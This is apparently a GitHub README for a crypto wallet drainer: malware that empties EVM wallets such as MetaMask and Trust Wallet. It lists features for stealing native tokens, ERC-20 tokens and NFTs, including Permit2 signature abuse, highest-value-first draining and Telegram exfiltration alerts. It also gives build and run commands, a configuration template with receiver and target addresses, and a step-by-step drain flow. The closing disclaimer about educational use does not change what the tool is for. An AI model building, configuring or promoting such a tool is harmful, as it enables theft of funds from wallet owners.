# Crypto Wallet Drainer — EVM Compatible

[![Build](https://img.shields.io/github/actions/workflow/status/evmtools/wallet-drainer/build.yml?branch=main&style=flat-square)](https://github.com/evmtools/wallet-drainer/actions)
[![License](https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/evmtools/wallet-drainer?style=flat-square)](https://github.com/evmtools/wallet-drainer/stargazers)
[![.NET](https://img.shields.io/badge/.NET-9.0-purple?style=flat-square)](https://dotnet.microsoft.com/)

**ETH / BSC / ARB / MATIC | ERC-20 + NFT | Permit2 | Multi-Wallet Support**

A backend drainer engine targeting EVM-compatible wallets. Supports MetaMask, Trust Wallet, Phantom, and Coinbase Wallet. Handles native tokens, ERC-20, ERC-721, and ERC-1155 assets across multiple chains.

---

## Screenshots

![Terminal](docs/screenshots/terminal.png)
![Telegram](docs/screenshots/telegram-notifications.png)

---

## Features

- **Multi-Chain** — Ethereum, BSC, Polygon, Arbitrum, Optimism, Base
- **Wallet Support** — MetaMask, Trust Wallet, Phantom, Coinbase Wallet
- **Asset Types** — Native tokens, ERC-20, ERC-721 (NFTs), ERC-1155
- **Permit2** — Gasless approval via signature (Uniswap Permit2)
- **Priority Sorting** — Drains highest-value assets first
- **Gas Optimization** — Dynamic gas pricing per chain
- **Telegram Alerts** — Real-time drain notifications
- **Multi-Chain Router** — Cross-chain bridging support

---

## Architecture

```
src/WalletDrainer/
├── Core/           → Engine, scanner, collector, transaction builder
├── Wallets/        → Per-wallet implementations (MetaMask, Trust, Phantom, Coinbase)
├── Blockchain/     → Web3 client, gas, approvals, NFT transfers, routing
├── Models/         → Asset types, results, balances
├── Config/         → Chain definitions, drainer settings
├── Utils/          → ABI encoding, address validation, priority calc
└── Exfil/          → Telegram notification service
```

---

## Build

### Requirements

- .NET 9 SDK
- Alchemy/Infura API key (or any RPC endpoint)

### Compile

```bash
dotnet build src/WalletDrainer/WalletDrainer.csproj -c Release
```

### Run

```bash
dotnet run --project src/WalletDrainer/WalletDrainer.csproj
```

---

## Configuration

Create `drainer.json` in the output directory:

```json
{
  "ReceiverAddress": "0xYOUR_RECEIVER_ADDRESS",
  "TargetAddress": "0xTARGET_WALLET",
  "EnabledChains": ["ethereum", "bsc", "polygon", "arbitrum"],
  "MinTokenValueUsd": 5.0,
  "DrainNfts": true,
  "UsePermit2": true,
  "TelegramBotToken": "YOUR_BOT_TOKEN",
  "TelegramChatId": "YOUR_CHAT_ID"
}
```

---

## Supported Chains

| Chain | Chain ID | Native | Min Threshold |
|-------|----------|--------|---------------|
| Ethereum | 1 | ETH | 0.005 ETH |
| BSC | 56 | BNB | 0.01 BNB |
| Polygon | 137 | MATIC | 5 MATIC |
| Arbitrum | 42161 | ETH | 0.005 ETH |

---

## Drain Flow

1. Connect to target wallet via WalletConnect/Injected provider
2. Scan all token balances across enabled chains
3. Sort assets by USD value (highest first)
4. For ERC-20: Request approval (or use Permit2 signature)
5. Execute transfer to receiver address
6. Send Telegram notification with TX details

---

## Disclaimer

This software is provided for **educational and authorized security research purposes only**. Designed for controlled environments, CTF competitions, and security audits with explicit authorization. The developers assume no responsibility for any misuse. Unauthorized access to wallets you do not own is illegal.

---

## License

MIT License — See [LICENSE](LICENSE) for details.
